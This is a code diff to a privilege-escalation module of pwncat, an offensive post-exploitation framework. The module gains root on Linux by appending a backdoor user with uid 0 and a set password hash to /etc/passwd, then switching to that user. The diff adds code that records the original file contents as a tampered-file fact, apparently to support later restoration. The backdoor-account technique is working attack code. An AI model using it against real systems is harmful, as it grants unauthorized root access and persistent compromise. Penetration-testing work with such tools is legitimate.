@@ -4,6 +4,7 @@ import crypt
 from pwncat.util import console
 from pwncat.facts import EscalationReplace
 from pwncat.modules import ModuleFailed
+from pwncat.facts.tamper import ReplacedFile
 from pwncat.platform.linux import Linux
 from pwncat.modules.enumerate import Schedule, EnumerateModule
 
@@ -12,11 +13,11 @@ class AppendPasswd(EscalationReplace):
     """ Escalation through adding a new user to /etc/passwd """
 
     def __init__(self, source, ability):
-        super().__init__(source=source, uid=ability.uid)
+        super().__init__(source=source, source_uid=ability.source_uid, uid=ability.uid)
 
         self.ability = ability
 
-    def escalate(self, session):
+    def escalate(self, session: "pwncat.manager.Session"):
 
         try:
             with session.platform.open("/etc/passwd", "r") as filp:
@@ -34,6 +35,7 @@ class AppendPasswd(EscalationReplace):
         if not any(line.startswith(f"{backdoor_user}:") for line in passwd_contents):
 
             # Add our password
+            saved_content = "".join(passwd_contents)
             passwd_contents.append(
                 f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}"""
             )
@@ -43,6 +45,16 @@ class AppendPasswd(EscalationReplace):
                 with self.ability.open(session, "/etc/passwd", "w") as filp:
                     filp.writelines(passwd_contents)
                     filp.write("\n")
+
+                # Ensure we track the tampered file
+                session.register_fact(
+                    ReplacedFile(
+                        source=self.source,
+                        uid=0,
+                        path="/etc/passwd",
+                        data=saved_content,
+                    )
+                )
             except (FileNotFoundError, PermissionError):
                 raise ModuleFailed("failed to write /etc/passwd")
 
@@ -58,7 +70,7 @@ class AppendPasswd(EscalationReplace):
             raise ModuleFailed("added user, but switch user failed")
 
     def title(self, session: "pwncat.manager.Session"):
-        return f"""add user via [blue]file write[/blue] as [red]root[/red] (w/ {self.ability.title(session)})"""
+        return f"""add user using {self.ability.title(session)}"""
 
 
 class Module(EnumerateModule):
